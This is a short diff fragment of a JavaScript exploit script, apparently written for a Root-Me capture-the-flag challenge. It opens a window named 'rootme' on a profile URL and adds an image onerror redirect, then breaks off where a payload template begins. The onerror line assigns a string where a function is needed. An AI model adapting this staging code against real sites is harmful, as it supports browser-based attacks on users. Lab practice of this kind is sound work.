@@ -20,6 +20,8 @@ function post(url, data) {
 // const id = urlParams.get("id");
 
 try {
+  document.getElementById("waitimg").onerror = `window.location = "${PROFILE}"`;
+
   const profile = window.open(PROFILE, "rootme");
 
   const payload = `
